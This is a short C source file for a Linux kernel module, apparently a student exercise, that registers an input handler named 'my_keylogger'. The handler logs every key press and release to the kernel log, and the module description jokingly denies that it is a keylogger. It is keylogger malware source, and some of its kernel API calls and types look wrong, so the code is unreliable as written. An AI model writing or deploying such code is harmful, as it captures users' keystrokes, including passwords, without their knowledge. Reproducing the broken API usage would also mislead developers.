#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/hid.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("281443-279460");
MODULE_DESCRIPTION("is definitly not keylogger");
MODULE_VERSION("1.0");

static struct input_handler my_handler;
static struct input_device_id my_id_table[] = {
    { .driver_info = 1 },
    { },
};

static int my_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    if (type == EV_KEY) {
        printk(KERN_INFO "Key %d %s\n", code, value ? "pressed" : "released");
    }
    return 0;
}

static int my_connect(struct input_handler *handler, struct input_device *dev) {
    struct input_handle *handle;

    handle = input_allocate_handle();
    if (!handle)
        return -ENOMEM;

    handle->handler = handler;
    handle->dev = dev;
    handle->event = my_event;

    return input_register_handle(handle);
}

static void my_disconnect(struct input_handle *handle) {
    input_unregister_handle(handle);
}

static struct input_handler my_handler = {
    .event = my_event,
    .connect = my_connect,
    .disconnect = my_disconnect,
    .name = "my_keylogger",
    .id_table = my_id_table,
};

static int __init my_module_init(void) {
    int result;

    result = input_register_handler(&my_handler);
    if (result) {
        printk(KERN_ERR "Failed to register input handler\n");
        return result;
    }

    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

static void __exit my_module_exit(void) {
    input_unregister_handler(&my_handler);
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(my_module_init);
module_exit(my_module_exit);

